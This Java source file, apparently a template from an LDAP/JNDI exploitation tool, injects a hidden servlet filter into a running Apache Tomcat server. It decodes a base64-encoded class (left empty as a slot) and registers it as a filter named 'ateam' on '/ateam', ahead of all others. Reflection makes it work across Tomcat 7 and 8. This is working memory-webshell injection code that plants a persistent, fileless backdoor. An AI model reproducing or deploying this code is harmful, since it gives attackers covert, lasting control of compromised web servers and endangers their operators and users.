package com.feihong.ldap.template;

import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
//import org.apache.tomcat.util.descriptor.web.FilterDef;
//import org.apache.tomcat.util.descriptor.web.FilterMap;
import sun.misc.BASE64Decoder;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;

/**
 * @ClassName: BehindFilter
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/8/9 10:29
 * @Version: v1.0.0
 * @Description:
 **/
public class BehindFilter extends ClassLoader{
    public BehindFilter()  {
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();
        StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();
        Class standardConteClass = null;

        try {
            standardConteClass = Class.forName("org.apache.catalina.core.StandardContext");
        } catch (ClassNotFoundException var24) {
            var24.printStackTrace();
        }

        Field filterconfigs = null;

        try {
            filterconfigs = standardConteClass.getDeclaredField("filterConfigs");
        } catch (NoSuchFieldException var23) {
            var23.printStackTrace();
        }

        filterconfigs.setAccessible(true);
        String base64class = "";
        BASE64Decoder base64Decoder = new BASE64Decoder();
        Class ccc = null;

        try {
            byte[] clazz = base64Decoder.decodeBuffer(base64class);
            ccc = super.defineClass(clazz, 0, clazz.length);
        } catch (IOException var22) {
            var22.printStackTrace();
        }

        Filter filter = null;

        try {
            filter = (Filter)ccc.newInstance();
        } catch (InstantiationException var20) {
            var20.printStackTrace();
        } catch (IllegalAccessException var21) {
            var21.printStackTrace();
        }

        Map configs = null;

        try {
            configs = (Map)filterconfigs.get(standardContext);
        } catch (IllegalAccessException var19) {
            var19.printStackTrace();
        }

        //生成 FilterDef
        //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
        Class filterDefClass = null;
        try {
            filterDefClass = Class.forName("org.apache.catalina.deploy.FilterDef");
        } catch (ClassNotFoundException e) {
            try {
                filterDefClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
            } catch (ClassNotFoundException classNotFoundException) {
                classNotFoundException.printStackTrace();
            }
        }
        Object filterDef = null;
        try {
            filterDef = filterDefClass.newInstance();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
        try {
            filterDef.getClass().getDeclaredMethod("setFilterName", String.class).invoke(filterDef,"ateam");
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }
        try {
            filterDef.getClass().getDeclaredMethod("setFilterClass",String.class).invoke(filterDef, filter.getClass().getName());
            standardContext.getClass().getDeclaredMethod("addFilterDef", filterDefClass).invoke(standardContext,filterDef);
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }

        //设置 FilterMap
        //由于 Tomcat7 和 Tomcat8 中 FilterDef 的包名不同，为了通用性，这里用反射来写
        Class filterMapClass = null;
        try {
            filterMapClass = Class.forName("org.apache.catalina.deploy.FilterMap");
        } catch (ClassNotFoundException e) {
            try {
                filterMapClass = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
            } catch (ClassNotFoundException classNotFoundException) {
                classNotFoundException.printStackTrace();
            }
        }


        try {
            Object filtermap = filterMapClass.newInstance();
            filtermap.getClass().getDeclaredMethod("setFilterName",String.class).invoke(filtermap,"ateam");
            filtermap.getClass().getDeclaredMethod("setDispatcher", String.class).invoke(filtermap, DispatcherType.REQUEST.name());
            filtermap.getClass().getDeclaredMethod("addURLPattern", String.class).invoke(filtermap, "/ateam");
            standardContext.getClass().getDeclaredMethod("addFilterMapBefore", filterMapClass).invoke(standardContext, filtermap);



        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }

//        FilterDef filterDef = new FilterDef();
//        filterDef.setFilter(filter);
//        filterDef.setFilterName("filter");
//        filterDef.setFilterClass(filter.getClass().getName());
//        standardContext.addFilterDef(filterDef);
//        FilterMap filterMap = new FilterMap();
//        filterMap.setFilterName("filter");
//        filterMap.setDispatcher(DispatcherType.REQUEST.name());
//        filterMap.addURLPattern("/filtercmd");
//        standardContext.addFilterMapBefore(filterMap);
        Constructor constructor = null;

        try {
            constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDefClass);
        } catch (NoSuchMethodException var18) {
            var18.printStackTrace();
        }

        constructor.setAccessible(true);
        ApplicationFilterConfig applicationFilterConfig = null;

        try {
            applicationFilterConfig = (ApplicationFilterConfig)constructor.newInstance(standardContext, filterDef);
        } catch (InstantiationException var15) {
            var15.printStackTrace();
        } catch (IllegalAccessException var16) {
            var16.printStackTrace();
        } catch (InvocationTargetException var17) {
            var17.printStackTrace();
        }

        configs.put("ateam", applicationFilterConfig);
    }
}
